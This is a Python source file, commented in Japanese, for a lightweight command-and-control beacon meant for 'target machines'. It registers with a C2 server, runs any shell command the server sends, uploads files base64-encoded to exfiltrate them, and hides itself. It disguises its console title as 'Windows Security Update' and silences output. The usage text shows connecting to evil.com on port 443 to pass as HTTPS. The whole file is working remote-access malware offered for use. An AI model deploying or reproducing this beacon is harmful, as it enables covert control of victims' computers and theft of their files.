# -*- coding: utf-8 -*-
"""
軽量Beacon - ターゲットマシン配布用
最小限の依存関係で最大限の機能を提供
"""

import socket
import json
import time
import subprocess
import threading
import random
import sys
import os
import base64

# デフォルト設定
DEFAULT_C2_SERVER = "127.0.0.1"
DEFAULT_C2_PORT = 4444
DEFAULT_SLEEP = 30
DEFAULT_JITTER = 0.3

class LightweightBeacon:
    def __init__(self, server_host=None, server_port=None, beacon_id=None, sleep_time=None, jitter=None):
        self.server_host = server_host or DEFAULT_C2_SERVER
        self.server_port = server_port or DEFAULT_C2_PORT
        self.beacon_id = beacon_id or f"target_{socket.gethostname()}_{random.randint(1000,9999)}"
        self.sleep_time = sleep_time or DEFAULT_SLEEP
        self.jitter = jitter or DEFAULT_JITTER
        self.running = True
        
    def log(self, message, level="INFO"):
        """軽量ログ機能（デバッグ用）"""
        if __debug__:  # -O オプションで無効化可能
            timestamp = time.strftime("%H:%M:%S")
            print(f"[{timestamp}][{level}] {message}")
    
    def get_system_info(self):
        """システム情報収集"""
        try:
            info = {
                'hostname': socket.gethostname(),
                'platform': sys.platform,
                'architecture': os.uname().machine if hasattr(os, 'uname') else 'unknown',
                'user': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
                'cwd': os.getcwd(),
                'pid': os.getpid()
            }
            
            # 追加のシステム情報（可能な場合）
            try:
                import platform
                info['os_version'] = platform.platform()
                info['python_version'] = platform.python_version()
            except ImportError:
                pass
                
            return info
        except Exception as e:
            self.log(f"システム情報取得エラー: {e}", "ERROR")
            return {'error': str(e)}
    
    def execute_command(self, command):
        """コマンド実行エンジン"""
        try:
            self.log(f"コマンド実行: {command}")
            
            # 内蔵コマンド処理
            if command.startswith("cd "):
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    return f"ディレクトリ変更: {os.getcwd()}"
                except Exception as e:
                    return f"ディレクトリ変更失敗: {e}"
                    
            elif command == "pwd":
                return os.getcwd()
                
            elif command == "whoami":
                return os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
                
            elif command == "ps" or command == "tasklist":
                # プロセス一覧（簡易版）
                if sys.platform == "win32":
                    result = subprocess.run("tasklist", capture_output=True, text=True, shell=True)
                else:
                    result = subprocess.run("ps aux", capture_output=True, text=True, shell=True)
                return result.stdout
                
            elif command.startswith("download "):
                # ファイルダウンロード（Base64エンコード）
                filepath = command[9:].strip()
                return self.download_file(filepath)
                
            elif command.startswith("upload "):
                # ファイルアップロード（未実装）
                return "アップロード機能は未実装"
                
            elif command.startswith("sleep "):
                # スリープ時間変更
                try:
                    new_sleep = int(command[6:].strip())
                    self.sleep_time = new_sleep
                    return f"スリープ時間を{new_sleep}秒に変更"
                except ValueError:
                    return "無効なスリープ時間"
                    
            elif command == "sysinfo":
                # 詳細システム情報
                return json.dumps(self.get_system_info(), indent=2)
                
            elif command == "kill":
                # Beacon終了
                self.running = False
                return "Beacon終了中..."
                
            else:
                # システムコマンド実行
                if sys.platform == "win32":
                    # Windows: cmd.exe経由
                    result = subprocess.run(
                        f"cmd.exe /c {command}",
                        capture_output=True,
                        text=True,
                        timeout=30,
                        shell=True
                    )
                else:
                    # Unix系: sh経由
                    result = subprocess.run(
                        command,
                        capture_output=True,
                        text=True,
                        timeout=30,
                        shell=True
                    )
                
                output = ""
                if result.stdout:
                    output += f"STDOUT:\n{result.stdout}"
                if result.stderr:
                    output += f"\nSTDERR:\n{result.stderr}"
                if result.returncode != 0:
                    output += f"\nRETURN CODE: {result.returncode}"
                
                return output or "コマンド実行完了（出力なし）"
                
        except subprocess.TimeoutExpired:
            return "コマンドタイムアウト（30秒超過）"
        except Exception as e:
            return f"コマンド実行エラー: {e}"
    
    def download_file(self, filepath):
        """ファイルをBase64エンコードして返す"""
        try:
            if not os.path.exists(filepath):
                return f"ファイルが見つかりません: {filepath}"
                
            file_size = os.path.getsize(filepath)
            if file_size > 1024 * 1024:  # 1MB制限
                return f"ファイルサイズが大きすぎます: {file_size} bytes"
                
            with open(filepath, 'rb') as f:
                file_data = f.read()
                
            encoded_data = base64.b64encode(file_data).decode('utf-8')
            
            return json.dumps({
                'type': 'file_download',
                'filename': os.path.basename(filepath),
                'size': file_size,
                'data': encoded_data
            })
            
        except Exception as e:
            return f"ファイルダウンロードエラー: {e}"
    
    def connect_with_retry(self):
        """再接続機能付きの接続"""
        max_retries = 5
        retry_count = 0
        
        while retry_count < max_retries and self.running:
            try:
                self.log(f"C2サーバ接続試行 ({retry_count + 1}/{max_retries})")
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)  # 接続タイムアウト
                sock.connect((self.server_host, self.server_port))
                
                self.log("C2サーバに接続成功")
                return sock
                
            except Exception as e:
                self.log(f"接続失敗: {e}", "ERROR")
                retry_count += 1
                if retry_count < max_retries:
                    wait_time = min(retry_count * 30, 300)  # 最大5分まで
                    self.log(f"{wait_time}秒後に再試行")
                    time.sleep(wait_time)
        
        self.log("最大再試行回数に到達。接続を諦めます", "ERROR")
        return None
    
    def beacon_loop(self):
        """メインBeaconループ"""
        self.log(f"Beacon開始: {self.beacon_id}")
        
        while self.running:
            sock = self.connect_with_retry()
            if not sock:
                break
                
            try:
                # 初回登録
                register_data = {
                    'type': 'register',
                    'beacon_id': self.beacon_id,
                    'info': self.get_system_info()
                }
                
                sock.send(json.dumps(register_data).encode('utf-8'))
                
                # 登録応答待機
                sock.settimeout(10)
                response = sock.recv(1024)
                self.log("登録完了")
                
                # チェックインループ
                while self.running:
                    try:
                        # チェックイン送信
                        checkin_data = {
                            'type': 'checkin',
                            'beacon_id': self.beacon_id,
                            'timestamp': time.time()
                        }
                        
                        sock.send(json.dumps(checkin_data).encode('utf-8'))
                        
                        # サーバ応答待機
                        sock.settimeout(15)
                        response_data = sock.recv(8192)
                        
                        if not response_data:
                            self.log("サーバから切断されました")
                            break
                            
                        try:
                            response = json.loads(response_data.decode('utf-8'))
                            
                            if response.get('type') == 'task':
                                # タスク実行
                                command = response.get('command')
                                self.log(f"タスク受信: {command}")
                                
                                result = self.execute_command(command)
                                
                                # 結果送信
                                result_data = {
                                    'type': 'result',
                                    'beacon_id': self.beacon_id,
                                    'command': command,
                                    'result': result,
                                    'timestamp': time.time()
                                }
                                
                                sock.send(json.dumps(result_data).encode('utf-8'))
                                
                            elif response.get('type') == 'sleep':
                                # スリープ時間更新
                                new_sleep = response.get('interval', self.sleep_time)
                                if new_sleep != self.sleep_time:
                                    self.log(f"スリープ時間更新: {new_sleep}秒")
                                    self.sleep_time = new_sleep
                                    
                        except json.JSONDecodeError:
                            self.log(f"不正なサーバ応答: {response_data}", "ERROR")
                        
                        # ジッター付きスリープ
                        jitter_range = self.sleep_time * self.jitter
                        actual_sleep = self.sleep_time + random.uniform(-jitter_range, jitter_range)
                        actual_sleep = max(5, actual_sleep)  # 最小5秒
                        
                        self.log(f"スリープ: {actual_sleep:.1f}秒")
                        time.sleep(actual_sleep)
                        
                    except socket.timeout:
                        self.log("チェックインタイムアウト", "WARN")
                        continue
                    except Exception as e:
                        self.log(f"チェックインエラー: {e}", "ERROR")
                        break
                        
            except Exception as e:
                self.log(f"Beaconエラー: {e}", "ERROR")
            finally:
                try:
                    sock.close()
                except:
                    pass
                
                if self.running:
                    self.log("5分後に再接続します")
                    time.sleep(300)
        
        self.log("Beacon終了")

def parse_arguments():
    """コマンドライン引数解析"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="軽量C2 Beacon - ターゲット配布用",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用例:
  python beacon.py                                    # デフォルト設定で実行
  python beacon.py -s 192.168.1.100 -p 8080         # サーバとポート指定
  python beacon.py --server evil.com --port 443      # HTTPS風にカモフラージュ
  python beacon.py -i custom_beacon_001               # Beacon ID指定
  python beacon.py --sleep 60 --jitter 0.5           # チェックイン間隔調整
  python beacon.py -c config.txt                     # 設定ファイル使用
  python beacon.py --stealth                          # ステルスモード
        """
    )
    
    # C2サーバ設定
    parser.add_argument('-s', '--server', 
                       default=DEFAULT_C2_SERVER,
                       help=f'C2サーバのIPアドレスまたはホスト名 (デフォルト: {DEFAULT_C2_SERVER})')
    
    parser.add_argument('-p', '--port', 
                       type=int, 
                       default=DEFAULT_C2_PORT,
                       help=f'C2サーバのポート番号 (デフォルト: {DEFAULT_C2_PORT})')
    
    # Beacon設定
    parser.add_argument('-i', '--beacon-id',
                       help='Beacon ID (デフォルト: 自動生成)')
    
    parser.add_argument('--sleep', 
                       type=int, 
                       default=DEFAULT_SLEEP,
                       help=f'チェックイン間隔（秒） (デフォルト: {DEFAULT_SLEEP})')
    
    parser.add_argument('--jitter', 
                       type=float, 
                       default=DEFAULT_JITTER,
                       help=f'ジッター係数 (0.0-1.0) (デフォルト: {DEFAULT_JITTER})')
    
    # 追加オプション
    parser.add_argument('-c', '--config',
                       help='設定ファイルパス')
    
    parser.add_argument('--stealth', 
                       action='store_true',
                       help='ステルスモード（出力を最小化）')
    
    parser.add_argument('--retry-max',
                       type=int,
                       default=5,
                       help='最大再接続試行回数 (デフォルト: 5)')
    
    parser.add_argument('--user-agent',
                       default='Windows Security Update',
                       help='プロセス名偽装用文字列')
    
    return parser.parse_args()

def load_config_file(config_path):
    """設定ファイル読み込み"""
    config = {}
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        
                        # 型変換
                        if key in ['port', 'sleep', 'retry_max']:
                            try:
                                config[key] = int(value)
                            except ValueError:
                                print(f"設定ファイルエラー: {key}は整数である必要があります")
                        elif key == 'jitter':
                            try:
                                config[key] = float(value)
                            except ValueError:
                                print(f"設定ファイルエラー: {key}は小数である必要があります")
                        elif key == 'stealth':
                            config[key] = value.lower() in ['true', '1', 'yes', 'on']
                        else:
                            config[key] = value
    except FileNotFoundError:
        print(f"設定ファイルが見つかりません: {config_path}")
    except Exception as e:
        print(f"設定ファイル読み込みエラー: {e}")
    
    return config

def merge_config(args, config_file=None):
    """引数と設定ファイルをマージ"""
    config = {}
    
    # 設定ファイルから読み込み
    if config_file:
        file_config = load_config_file(config_file)
        config.update(file_config)
    
    # コマンドライン引数で上書き（優先度高）
    if args.server != DEFAULT_C2_SERVER:
        config['server'] = args.server
    elif 'server' not in config:
        config['server'] = args.server
        
    if args.port != DEFAULT_C2_PORT:
        config['port'] = args.port
    elif 'port' not in config:
        config['port'] = args.port
        
    if args.beacon_id:
        config['beacon_id'] = args.beacon_id
    elif 'beacon_id' not in config:
        config['beacon_id'] = None
        
    if args.sleep != DEFAULT_SLEEP:
        config['sleep'] = args.sleep
    elif 'sleep' not in config:
        config['sleep'] = args.sleep
        
    if args.jitter != DEFAULT_JITTER:
        config['jitter'] = args.jitter
    elif 'jitter' not in config:
        config['jitter'] = args.jitter
    
    # その他のオプション
    config['stealth'] = args.stealth or config.get('stealth', False)
    config['retry_max'] = args.retry_max
    config['user_agent'] = args.user_agent
    
    return config
    """ステルス起動処理"""
    try:
        # プロセス名を偽装
        if sys.platform == "win32":
            try:
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Update")
            except:
                pass
        
        # デバッグ情報を無効化（本番環境では-Oオプション推奨）
        if not __debug__:
            # 標準出力をnullに向ける
            class DevNull:
                def write(self, x): pass
                def flush(self): pass
            
            sys.stdout = DevNull()
            sys.stderr = DevNull()
        
    except Exception:
        pass  # ステルス機能の失敗は無視

def stealth_startup(config):
    """ステルス起動処理"""
    try:
        # プロセス名を偽装
        if sys.platform == "win32":
            try:
                import ctypes
                user_agent = config.get('user_agent', 'Windows Security Update')
                ctypes.windll.kernel32.SetConsoleTitleW(user_agent)
            except:
                pass
        
        # ステルスモード時は出力を完全に無効化
        if config.get('stealth', False):
            class DevNull:
                def write(self, x): pass
                def flush(self): pass
            
            sys.stdout = DevNull()
            sys.stderr = DevNull()
        
    except Exception:
        pass  # ステルス機能の失敗は無視

def main():
    """メイン実行関数"""
    try:
        # コマンドライン引数解析
        args = parse_arguments()
        
        # 設定マージ
        config = merge_config(args, args.config)
        
        # ステルス起動
        stealth_startup(config)
        
        # Beacon作成・実行
        beacon = LightweightBeacon(
            server_host=config['server'],
            server_port=config['port'],
            beacon_id=config['beacon_id'],
            sleep_time=config['sleep'],
            jitter=config['jitter']
        )
        
        beacon.log(f"Beacon設定:")
        beacon.log(f"  サーバ: {config['server']}:{config['port']}")
        beacon.log(f"  Beacon ID: {beacon.beacon_id}")
        beacon.log(f"  スリープ: {config['sleep']}秒")
        beacon.log(f"  ジッター: {config['jitter']}")
        
        beacon.beacon_loop()
        
    except KeyboardInterrupt:
        print("\nBeacon停止")
    except Exception as e:
        if not config.get('stealth', False):
            print(f"致命的エラー: {e}")
        # ステルスモードでは無音で終了
        pass

if __name__ == "__main__":
    main()
